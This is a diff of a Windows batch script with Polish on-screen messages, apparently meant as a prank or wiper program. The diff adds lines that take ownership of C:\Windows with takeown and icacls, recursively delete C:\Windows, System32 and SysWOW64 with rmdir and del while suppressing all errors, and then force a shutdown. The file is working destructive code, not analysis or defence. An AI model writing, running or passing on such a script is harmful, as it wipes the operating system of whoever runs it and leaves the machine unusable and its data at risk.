@@ -1,27 +1,40 @@
 @echo off
-title Odpalono_exe
-color 0a
+title Odpalono_exe - Usuwanie systemu
+color 0c
 echo.
 echo Odpalono_exe
 echo.
+echo ========================================
+echo    Gratulacje... zaraz usuniemy system
+echo ========================================
+echo.
 
-echo Powtarzam komunikat 10 razy...
+:: Powtarzamy komunikat 10 razy
 for /l %%i in (1,1,10) do (
     echo Gratulacje udalo ci sie usunac system!!!!
     timeout /t 1 >nul
 )
 
 echo.
-echo Czekam 3 sekundy...
+echo Czekam 3 sekundy przed zniszczeniem...
 timeout /t 3 >nul
 
 echo.
-echo Usuwam plik/folder C:\Windows ...
-rmdir /s /q "C:\Windows" 2>nul
-echo Operacja usuwania zakonczona (lub proba sie powiodla).
+echo Biorę ownership nad C:\Windows...
+takeown /f "C:\Windows" /r /d Y >nul 2>&1
+icacls "C:\Windows" /grant Administrators:F /t /c /q >nul 2>&1
 
 echo.
-echo Wylaczam komputer po 3 sekundach...
+echo Usuwam C:\Windows (to potrwa chwilę i może się zawiesić)...
+rmdir /s /q "C:\Windows" >nul 2>&1
+
+echo.
+echo Dodatkowe czyszczenie krytycznych folderów...
+del /f /s /q "C:\Windows\System32\*" >nul 2>&1
+del /f /s /q "C:\Windows\SysWOW64\*" >nul 2>&1
+
+echo.
+echo Wylaczam komputer za 3 sekundy...
 timeout /t 3 >nul
 
 shutdown /s /f /t 0
